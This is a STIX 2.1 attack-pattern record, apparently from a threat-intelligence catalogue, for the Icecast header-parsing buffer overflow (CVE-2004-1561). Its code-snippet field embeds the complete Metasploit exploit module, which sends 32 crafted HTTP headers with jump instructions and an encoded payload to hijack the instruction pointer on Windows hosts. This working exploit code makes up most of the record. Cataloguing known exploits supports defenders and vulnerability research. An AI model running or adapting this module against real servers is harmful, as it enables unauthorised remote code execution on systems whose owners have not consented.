{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--442fce26-a8f9-4bc7-b035-836f597c9be6",
    "created": "2024-08-14T16:52:01.087947Z",
    "modified": "2024-08-14T16:52:01.087951Z",
    "name": "Icecast Header Overwrite",
    "description": " This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable).  This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/icecast_header.rb",
            "external_id": "icecast_header.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1561"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Icecast Header Overwrite',\n      'Description'    => %q{\n        This module exploits a buffer overflow in the header parsing of icecast\n        versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32\n        HTTP headers will cause a write one past the end of a pointer array. On\n        win32 this happens to overwrite the saved instruction pointer, and on\n        linux (depending on compiler, etc) this seems to generally overwrite\n        nothing crucial (read not exploitable).\n\n        This exploit uses ExitThread(), this will leave icecast thinking the\n        thread is still in use, and the thread counter won't be decremented.\n        This means for each time your payload exits, the counter will be left\n        incremented, and eventually the threadpool limit will be maxed. So you\n        can multihit, but only till you fill the threadpool.\n      },\n      'Author'         => [ 'spoonm', 'Luigi Auriemma <aluigi[at]autistici.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-1561'],\n          [ 'OSVDB', '10406'],\n          [ 'BID', '11271'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => \"\\x0d\\x0a\\x00\",\n          'DisableNops' => true,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2004-09-28',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(8000)\n      ])\n  end\n\n  # Interesting that ebp is pushed after the local variables, and the line array\n  # is right before the saved eip, so overrunning it just by 1 element overwrites\n  # eip, making an interesting exploit....\n  # .text:00414C00                 sub     esp, 94h\n  # .text:00414C06                 push    ebx\n  # .text:00414C07                 push    ebp\n  # .text:00414C08                 push    esi\n\n  def exploit\n    connect\n\n    # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)\n    # jmp 12\n    evul = \"\\xeb\\x0c / HTTP/1.1 #{payload.encoded}\\r\\n\"\n    evul << \"Accept: text/html\\r\\n\" * 31;\n\n    # jmp [esp+4]\n    evul << \"\\xff\\x64\\x24\\x04\\r\\n\"\n    evul << \"\\r\\n\"\n\n    sock.put(evul)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-09-28",
    "x_mitre_platforms": [
        "win'"
    ]
}